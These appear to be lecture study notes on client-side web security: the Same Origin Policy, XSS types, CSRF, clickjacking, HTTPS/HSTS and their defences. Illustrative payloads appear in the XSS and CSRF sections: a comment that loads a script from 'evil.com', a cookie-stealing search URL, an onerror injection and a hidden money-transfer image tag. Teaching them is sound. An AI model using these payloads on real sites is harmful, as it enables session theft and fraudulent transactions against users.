# Web Security (Part II): Client-Side Security, SOP, XSS, and CSRF

**Tags:** #WebSecurity #CyberSecurity #SOP #XSS #CSRF #CSP #HSTS #Clickjacking #AppSec
**Source:** ![[5 - Web Security (part II).pdf]]

---

## 1. The Browser as an Operating System

To understand modern web security, one must first recognize that the web browser has evolved from a simple document viewer into a complex **Distributed Operating System**.

### 1.1 The Analogy
In a traditional Operating System (OS), the goal is to manage resources (CPU, Disk, Memory) and isolate users from one another. The browser mimics this architecture almost perfectly, but with different primitives:

* **Principals:**
    * *OS:* Users (root, alice, bob).
    * *Browser:* **Origins** (protocol + domain + port).
* **Execution Units:**
    * *OS:* Processes and Threads.
    * *Browser:* Windows, Tabs, Frames, and Web Workers.
* **System Calls:**
    * *OS:* `open()`, `read()`, `write()`, `fork()`.
    * *Browser:* Document Object Model (DOM) API, `fetch()`, `cookieStore`, `localStorage`.
* **Access Control:**
    * *OS:* Discretionary Access Control (DAC) - users set permissions on files.
    * *Browser:* **Mandatory Access Control** - governed strictly by the **Same Origin Policy (SOP)**.

### 1.2 The Threat Landscape
Just as an OS is vulnerable to buffer overflows or privilege escalation, browsers are vulnerable to scripts escaping their sandbox or manipulating the state of other origins. The complexity of the browser (millions of lines of C++ code in engines like V8 or Gecko) means the attack surface is enormous.

---

## 2. The Same Origin Policy (SOP)

The Same Origin Policy is the cornerstone of the web security model. It isolates the content of one website from another. Without SOP, a malicious website open in one tab could read your emails from a webmail provider open in another tab.

### 2.1 Defining an "Origin"
Two resources are considered to be of the **same origin** if and only if they share the exact same:
1.  **Protocol** (e.g., `http` vs. `https`)
2.  **Host** (e.g., `example.com`)
3.  **Port** (e.g., `80` vs. `443` vs. `8080`)

**Example: Comparisons against `http://www.example.com/dir/page.html`**

| URL | Outcome | Reason |
| :--- | :--- | :--- |
| `http://www.example.com/other.html` | **Match** | Same protocol, host, and port (default 80). |
| `https://www.example.com/page.html` | **Fail** | Different Protocol (HTTPS). |
| `http://example.com/page.html` | **Fail** | Different Host (subdomain mismatch). |
| `http://www.example.com:81/page.html` | **Fail** | Different Port. |
| `http://v2.www.example.com/page.html` | **Fail** | Different Host. |

### 2.2 Rules of Engagement
The SOP is not a total firewall; it is selective.
* **Writes:** generally allowed. You can submit a form to any site (Cross-Origin Write).
* **Embedding:** generally allowed. You can display an image, play a video, or run a script from another domain (e.g., loading jQuery from a CDN).
* **Reads:** **Strictly Forbidden.** A script from Origin A cannot read the DOM, cookies, or local storage of Origin B.

### 2.3 Exceptions and Relaxations
* **`document.domain`:** A legacy property that allows subdomains (e.g., `login.site.com` and `blog.site.com`) to communicate by setting `document.domain = 'site.com'`. This is increasingly deprecated due to security risks.
* **CORS (Cross-Origin Resource Sharing):** A modern standard where a server explicitly whitelists other origins via HTTP headers (e.g., `Access-Control-Allow-Origin: https://trusted.com`). This allows browsers to relax SOP for API calls.

---

## 3. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows the executed script to run within the victim's browser **under the context of the vulnerable site**.

Because the script runs in the legitimate origin, it bypasses the Same Origin Policy. It can read cookies, session tokens, and user data.

### 3.1 Reflected XSS
The malicious script is reflected off the web server, such as in an error message or a search result.
* **Mechanism:** The attack payload is delivered via the request (URL parameters or headers).
* **Scenario:**
    1.  Attacker sends a phishing email with a link: `http://bank.com/search?q=<script>stealCookies()</script>`.
    2.  The victim clicks the link.
    3.  The server reflects the input: `Your search for '<script>...</script>' yielded 0 results.`
    4.  The browser executes the script.
* **Scope:** Non-persistent. Affects only the user who clicks the specific link.

### 3.2 Stored XSS (Persistent)
The malicious script is permanently stored on the target server, such as in a database, forum post, or comment section.
* **Mechanism:** The attacker submits the payload once. The server saves it.
* **Scenario:**
    1.  Attacker posts a comment: `Great article! <script src="http://evil.com/exploit.js"></script>`.
    2.  The server saves this comment to the database.
    3.  Every user who views the article loads the comment.
    4.  The script executes in *every* victim's browser.
* **Scope:** Highly dangerous. It creates a "watering hole" attack where legitimate users are compromised just by visiting a trusted page.

### 3.3 DOM-based XSS
The vulnerability exists entirely in the client-side code. The server may serve a static page, but the JavaScript on that page processes user input insecurely.
* **Mechanism:** Data flows from a **Source** (e.g., `location.hash`, `window.name`) into a **Sink** (e.g., `innerHTML`, `document.write`, `eval`) without sanitization.
* **Example:**
    ```javascript
    // Vulnerable Code
    var name = document.location.hash.substring(1);
    document.getElementById('welcome').innerHTML = "Hello " + name;
    ```
    If the user visits `page.html#<img src=x onerror=alert(1)>`, the payload executes. The server might never see this payload if it stays in the URL fragment.

---

## 4. XSS Mitigations and Defenses

Protecting against XSS requires a defense-in-depth approach, combining input handling with browser-level security features.

### 4.1 Context-Sensitive Output Encoding
This is the most effective primary defense. Before rendering user input, convert special characters into their safe HTML entity equivalents.
* **HTML Context:** Convert `<` to `&lt;`, `>` to `&gt;`, `&` to `&amp;`, `"` to `&quot;`.
* **Attribute Context:** If inserting data into `<div class="...">`, you must encode specifically for attributes.
* **JavaScript Context:** If inserting data into a `<script>` block, you must use Unicode escapes (e.g., `\u003C` for `<`) to prevent breaking out of the string.

### 4.2 Content Security Policy (CSP)
CSP is an HTTP response header that allows site administrators to declare approved sources of content that browsers are allowed to load. It effectively kills XSS by stopping the execution of unauthorized scripts.

**Example Header:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; img-src *;
```

**How it works:**
1.  **`script-src 'self'`:** Only allow scripts from the same origin.
2.  **No Inline Scripts:** CSP disables `<script>...</script>` tags and `onclick="..."` handlers by default. This neutralizes reflected XSS because the attacker cannot inject inline code.
3.  **Reporting:** CSP can operate in `Report-Only` mode to log violations without blocking them, helping developers debug their policies.

**Nonces and Hashes:**
For cases where inline scripts are necessary, CSP supports **nonces** (a random number generated per request).
```html
<script nonce="randomBase64Value"> ... </script>
```
The policy `script-src 'nonce-randomBase64Value'` ensures that only the script tag with the matching cryptographic token will execute. An attacker injecting a script tag won't know the nonce, so their script will be blocked.

### 4.3 Sanitization
For applications that *must* allow rich text (like a blog CMS allowing bold/italics), encoding is too aggressive. **Sanitization** libraries (like **DOMPurify**) parse the [[3 Web Technology#3.1 Static Content|HTML]] and remove dangerous tags (like `<script>`, `<object>`, `<iframe>`) and attributes (like `onerror`, `onload`) while leaving safe formatting tags (`<b>`, `<i>`).

---

## 5. Cross-Site Request Forgery (CSRF)

CSRF (also known as XSRF or "Sea-Surf") attacks exploits the trust that a site has in a user's browser. While XSS exploits the user's trust in a site, CSRF forces the user to perform unwanted actions on a site they are currently authenticated to.

### 5.1 The Mechanism
The web relies on cookies for session management. By default, browsers automatically attach cookies to requests made to the domain that set them, even if the request was initiated by a third-party site.

**The Attack Flow:**
1.  User logs into `bank.com` and gets a session cookie.
2.  User opens a new tab and visits `evil.com`.
3.  `evil.com` contains a hidden form or image:
    ```html
    <img src="http://bank.com/transfer?to=attacker&amount=1000" width="0" height="0">
    ```
4.  The browser parses the `img` tag and sends a GET request to `bank.com`.
5.  **Critical Step:** The browser *automatically* attaches the `bank.com` session cookie.
6.  The bank server receives a valid request with a valid cookie and processes the transfer.

### 5.2 Defenses against CSRF

#### The Synchronizer Token Pattern (Anti-CSRF Token)
This is the standard state-based defense.
1.  When the user loads a form, the server generates a cryptographically strong, random token.
2.  This token is embedded in the form as a hidden field:
    ```html
    <input type="hidden" name="csrf_token" value="a87b3...91f">
    ```
3.  When the form is submitted, the server checks if the submitted token matches the one stored in the user's session.
4.  **Why it works:** The attacker on `evil.com` cannot read the token from `bank.com` due to the **Same Origin Policy**. They can send the request, but they cannot guess the token, so the server rejects the request.

#### The `SameSite` Cookie Attribute
A modern browser defense that allows the server to instruct the browser *when* to send cookies.
* `SameSite=Strict`: The cookie is sent **only** for first-party requests. If you click a link from Facebook to your Bank, the Bank opens *without* the session cookie (user appears logged out). Maximum security, but bad UX.
* `SameSite=Lax`: The cookie is sent for top-level navigations (clicking a link) but blocked for cross-site subrequests (images, iframes, POSTs). This balances security and UX and is the default in modern Chrome/Firefox.
* `SameSite=None`: The old behavior (cookies sent everywhere). Requires the `Secure` attribute (HTTPS).

#### Double-Submit Cookie
Used in stateless environments (APIs). The client generates a random value and sends it in both a Cookie and a Request Header. The server verifies they match. Since an attacker can write data but generally cannot set specific cookies on the target domain (depending on subdomain structure), this provides protection.

---

## 6. Clickjacking (UI Redressing)

Clickjacking is an interface-based attack where a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

### 6.1 The Mechanism
1.  The attacker creates a page with a video player or a "Claim Prize" button.
2.  Over that button, the attacker positions a transparent `<iframe>` loading the victim's bank "Confirm Transfer" page.
3.  The iframe has `opacity: 0` (invisible) and a high `z-index` (sits on top).
4.  The user thinks they are clicking "Play Video," but the click passes through and hits the "Confirm" button in the invisible iframe.

### 6.2 Defenses

#### X-Frame-Options (XFO)
An HTTP header that instructs the browser whether a page can be rendered within a frame.
* `DENY`: The page cannot be displayed in a frame, regardless of the site attempting to do so.
* `SAMEORIGIN`: The page can only be displayed in a frame on the same origin as the page itself.

#### CSP: `frame-ancestors`
The modern successor to X-Frame-Options. It allows for more granular control (e.g., allowing specific partners to frame your content).
```http
Content-Security-Policy: frame-ancestors 'self' https://partner-site.com;
```

#### Frame-Busting Scripts (Legacy)
Old Javascript code used to prevent framing:
```javascript
if (top !== self) top.location = self.location;
```
These are generally unreliable as they can be blocked by the framing page using the `sandbox` attribute on the iframe.

---

## 7. Secured Transport (HTTPS and HSTS)

While application logic vulnerabilities (XSS, CSRF) are critical, network-level attacks remain a threat. If the communication channel is not secure, an attacker can modify the code in transit (injecting XSS) or steal cookies.

### 7.1 HTTPS and the Trust Model
HTTPS wraps [[3 Web Technology#2.2 The HTTP Protocol|HTTP]] in **TLS (Transport Layer Security)**. It guarantees:
1.  **Confidentiality:** Traffic is encrypted.
2.  **Integrity:** Traffic cannot be modified in transit.
3.  **Authenticity:** The server proves its identity via a Certificate signed by a Trusted Certificate Authority (CA).

### 7.2 SSL Stripping
A user often types `example.com` into the address bar. The browser defaults to `http://example.com`. The server then sends a `301 Redirect` to `https://example.com`.
* **The Attack:** A Man-in-the-Middle (MitM) intercepts the initial HTTP request. They proxy the connection to the HTTPS server but serve the content back to the victim over HTTP. The user sees the site, but the lock icon is missing. The attacker sees all plaintext data.

### 7.3 HTTP Strict Transport Security (HSTS)
HSTS defeats SSL stripping by telling the browser: "For the next X seconds, **always** connect to me via HTTPS, even if the user asks for HTTP."

**The Header:**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
* **Trust on First Use (TOFU) Problem:** HSTS only works *after* the first successful HTTPS connection. The very first connection is still vulnerable to stripping.

### 7.4 HSTS Preload List
To solve the TOFU problem, browser vendors (Google, Mozilla) maintain a hardcoded list of domains that are compiled directly into the browser binary. If a domain is on the **HSTS Preload List**, the browser knows to use HTTPS before it even sends the first packet.

### 7.5 NTP Attacks
A sophisticated attack against HSTS involves the **Network Time Protocol (NTP)**.
* Most OSs update time via NTP without authentication.
* An attacker (MitM) can forge an NTP response to set the victim's system clock years into the future.
* This causes the HSTS policy (and SSL certificates) to expire.
* The browser reverts to allowing HTTP, enabling SSL stripping again.

---

## 8. Summary of Client-Side Security

| Threat | Mechanism | Primary Defense | Secondary Defense |
| :--- | :--- | :--- | :--- |
| **XSS** | Script injection via unsanitized input | **Output Encoding** (Context-aware) | **CSP**, Input Validation |
| **CSRF** | Unauthorized commands via session cookies | **Anti-CSRF Tokens** | **SameSite** Cookies |
| **Clickjacking**| Invisible iframes capturing clicks | **X-Frame-Options** | CSP `frame-ancestors` |
| **MitM / Sniffing**| Intercepting plaintext traffic | **HTTPS** (TLS) | **HSTS** & Preloading |